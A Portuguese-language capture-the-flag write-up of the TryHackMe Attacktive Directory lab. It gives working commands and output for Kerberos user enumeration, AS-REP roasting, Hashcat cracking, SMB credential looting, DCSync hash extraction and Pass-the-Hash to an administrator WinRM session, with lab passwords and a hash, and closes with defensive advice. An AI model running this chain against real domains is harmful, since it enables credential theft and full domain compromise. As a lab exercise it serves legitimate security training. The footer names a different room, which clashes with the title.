# Attacktive Directory — TryHackMe

**Autor:** Nicolas Henrique  
**Data da sessão:** 14/10/2026  
**Ambiente:** laboratório Windows / Active Directory  
**Resultado:** acesso por WinRM como Administrator e leitura das três flags.

> Contém spoilers. Os endereços e as credenciais apresentados pertencem ao laboratório. O texto foi organizado a partir dos arquivos salvos durante a resolução; comandos reconstruídos estão identificados.

## Caminho da resolução

A enumeração revelou o domínio `spookysec.local`. Depois de identificar usuários válidos pelo Kerberos, consegui obter uma resposta AS-REP da conta `svc-admin` e recuperar sua senha com uma wordlist. Essa conta permitiu acessar um compartilhamento SMB que continha as credenciais de `backup`. Com elas, extraí os hashes do domínio e usei o hash de Administrator para abrir uma sessão WinRM.

```text
Enumeração de serviços e usuários
  → AS-REP Roasting de svc-admin
  → recuperação da senha com Hashcat
  → leitura do compartilhamento backup
  → credenciais de backup codificadas em Base64
  → extração de hashes via DRSUAPI
  → Pass-the-Hash como Administrator
  → leitura das flags
```

## 1. Identificando o domínio

O scan salvo foi direcionado a seis portas:

```bash
nmap -Pn -n -sV -p 53,88,135,139,389,445 -oN nmap.txt 10.112.179.208
```

| Porta | Serviço identificado | Utilidade na investigação |
|---|---|---|
| 53 | DNS | Resolução de nomes do ambiente |
| 88 | Kerberos | Autenticação e enumeração de usuários |
| 135 | MSRPC | Serviços RPC do Windows |
| 139 | NetBIOS | Serviços relacionados ao compartilhamento Windows |
| 389 | LDAP | Informações do Active Directory |
| 445 | SMB | Acesso aos compartilhamentos |

O LDAP revelou `spookysec.local`, e o nome do host retornado foi `ATTACKTIVEDIREC`.

O arquivo não representa uma varredura de todas as portas. A porta 5985, usada mais tarde pelo WinRM, não estava entre as portas consultadas; sua disponibilidade ficou demonstrada pela conexão posterior.

## 2. Enumerando usuários com Kerbrute

O arquivo `kerbrute.txt` registrou usuários válidos no domínio. A linha de execução original não ficou salva; este é um comando equivalente para reproduzir a etapa com a lista local:

```bash
kerbrute userenum -d spookysec.local --dc 10.112.179.208 userlist.txt -o kerbrute.txt
```

O Kerbrute usa diferenças nas respostas do Kerberos para verificar a existência das contas. Nessa etapa, encontrar um usuário não significa conhecer sua senha. A documentação da ferramenta explica esse comportamento em [User Enumeration](https://github.com/ropnop/kerbrute#user-enumeration).

Alguns resultados apareceram com variações de maiúsculas e minúsculas. Organizei a lista removendo essas repetições. Para também remover os códigos de cor presentes no arquivo original, a versão abaixo acrescenta essa limpeza ao comando registrado:

```bash
sed -E 's/\x1B\[[0-9;]*[mK]//g' kerbrute.txt \
  | grep 'VALID USERNAME:' \
  | awk '{print $NF}' \
  | cut -d@ -f1 \
  | tr '[:upper:]' '[:lower:]' \
  | sort -u > valid_users.txt
```

Resultado salvo:

```text
administrator
backup
darkstar
james
paradox
robin
svc-admin
```

## 3. AS-REP Roasting

Com a lista pronta, usei o GetNPUsers:

```bash
impacket-GetNPUsers spookysec.local/ \
  -usersfile valid_users.txt \
  -dc-ip 10.112.179.208 \
  -no-pass \
  -request \
  -outputfile hashes.txt
```

As outras contas testadas exigiam pré-autenticação. Para `svc-admin`, a ferramenta retornou material no formato:

```text
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:...
```

A conta estava configurada sem exigir pré-autenticação Kerberos. Isso permitiu obter uma resposta com uma parte criptografada derivada da senha e testar candidatos localmente. Ainda não era uma senha em texto claro nem um hash NT pronto para Pass-the-Hash.

## 4. Recuperando a senha e ajustando o Hashcat

Usei o modo 18200, correspondente ao AS-REP etype 23:

```bash
hashcat -m 18200 hashes.txt passwordlist.txt
```

A primeira tentativa falhou porque `passwordlist.txt` ainda não estava no diretório. Baixei a lista utilizada pelo lab:

```bash
wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
```

Depois apareceu `No devices found/left.`. No meu ambiente, resolvi instalando o backend OpenCL para CPU:

```bash
sudo apt update
sudo apt install -y pocl-opencl-icd ocl-icd-libopencl1 clinfo
hashcat -I
```

O Hashcat passou a reconhecer a CPU via PoCL. Executei novamente:

```bash
hashcat -m 18200 hashes.txt passwordlist.txt
hashcat -m 18200 hashes.txt --show
```

O resultado foi `Status: Cracked`, com a senha de laboratório `management2005` para `svc-admin`.

Esses ajustes eram do ambiente local. O erro de dispositivo não indicava problema na resposta AS-REP obtida do alvo.

## 5. Acessando o compartilhamento SMB

Com a senha recuperada, listei os compartilhamentos:

```bash
smbclient -L //10.112.179.208 -U svc-admin%management2005
```

A saída mostrou `ADMIN$`, `backup`, `C$`, `IPC$`, `NETLOGON` e `SYSVOL`. Depois da listagem, houve uma falha na tentativa de listar o grupo de trabalho usando SMB1. A enumeração dos compartilhamentos já havia funcionado, então prossegui:

```bash
smbclient //10.112.179.208/backup -U svc-admin%management2005
```

No prompt do SMB:

```text
ls
get backup_credentials.txt
exit
```

O arquivo baixado continha:

```text
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

A decodificação produz `backup@spookysec.local:backup2517860`. O comando de decodificação não ficou registrado; esta é uma forma equivalente de conferir o conteúdo salvo:

```bash
base64 -d backup_credentials.txt
```

Base64 apenas representa os dados em outro formato. Qualquer pessoa com acesso ao arquivo consegue recuperar essas credenciais.

## 6. Extraindo os hashes com a conta backup

Nas primeiras tentativas, o argumento foi passado como `backup@spookysec.local:senha@IP`, e a autenticação falhou. A chamada que funcionou usou o domínio antes do usuário, separado por `/`:

```bash
impacket-secretsdump 'spookysec.local/backup:backup2517860@10.112.179.208'
```

A saída começou com um erro, mas continuou:

```text
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
```

Em seguida, apareceram os hashes das contas do domínio, incluindo Administrator:

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
```

O erro de `RemoteOperations` não impediu a extração por DRSUAPI. O resultado demonstra que a conta `backup` conseguiu obter os segredos por esse mecanismo de replicação, numa operação de DCSync. Não foi necessário copiar manualmente o arquivo NTDS.DIT.

Os registros não incluem uma inspeção das ACLs do domínio. Por isso, não atribuo uma associação a grupo ou uma delegação específica à conta: o que está comprovado é a extração bem-sucedida.

## 7. Pass-the-Hash e sessão administrativa

Usei o hash NT de Administrator com o cliente `evil-winrm-py`:

```bash
evil-winrm-py -i 10.112.179.208 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

A conexão abriu a sessão:

```text
[*] Connecting to '10.112.179.208:5985' as 'Administrator'
evil-winrm-py PS C:\Users\Administrator\Documents>
```

Nessa etapa, o hash foi usado diretamente na autenticação NTLM. Não precisei recuperar a senha em texto claro de Administrator.

Também testei o hash de `svc-admin` no WinRM, mas as tentativas retornaram falha. Isso não invalida o acesso SMB que já havia funcionado com essa conta. O registro não permite determinar sozinho a causa da recusa no WinRM.

## 8. Leitura das flags

Primeiro, naveguei até o Desktop de Administrator e li `root.txt`. Depois, voltei a uma sessão de Administrator e acessei os diretórios de `backup` e `svc-admin`.

Abaixo estão comandos com caminhos completos, equivalentes à navegação com `cd` e às leituras registradas:

```powershell
Get-Content 'C:\Users\Administrator\Desktop\root.txt'
Get-Content 'C:\Users\backup\Desktop\PrivEsc.txt'
Get-Content 'C:\Users\svc-admin\Desktop\user.txt.txt'
```

| Arquivo | Resultado |
|---|---|
| `Administrator\Desktop\root.txt` | Flag administrativa lida |
| `backup\Desktop\PrivEsc.txt` | Flag de escalada lida |
| `svc-admin\Desktop\user.txt.txt` | Flag de usuário lida |

Os valores foram omitidos desta writeup e continuam nos registros originais. As três leituras ocorreram na sessão administrativa; entrar na pasta de outro usuário não muda a identidade da sessão.

## O que fica deste lab

A resolução dependeu de uma sequência de configurações: pré-autenticação desativada para uma conta com senha presente na wordlist, credenciais expostas em um compartilhamento e uma segunda conta capaz de extrair segredos do domínio.

Cada resultado abriu a próxima etapa. A senha de `svc-admin` serviu para acessar SMB; o arquivo encontrado levou à conta `backup`; a extração revelou o hash que permitiu a sessão administrativa.

Também ficou uma lição prática sobre interpretar a saída completa. A falha de SMB1 veio depois de uma listagem válida, e o erro de RemoteOperations foi seguido pela extração dos hashes. Já os erros de sintaxe e de backend precisaram de ajustes antes de prosseguir.

## Como interromper esse caminho

- Exigir pré-autenticação Kerberos nas contas que não tenham uma necessidade excepcional documentada.
- Usar senhas fortes para contas de serviço e gerenciar sua rotação.
- Remover credenciais de arquivos compartilhados e revisar quem consegue lê-los.
- Restringir os direitos de replicação do diretório às identidades que realmente precisam deles.
- Restringir o acesso administrativo remoto e monitorar autenticações e operações de replicação incomuns.

Essas são recomendações decorrentes da resolução; nenhuma alteração defensiva foi aplicada ao alvo durante a sessão documentada.

---

*Por [Nicolas Henrique](https://github.com/nicolashenrique-dev). Room: [Biohazard](https://tryhackme.com/room/biohazard).*



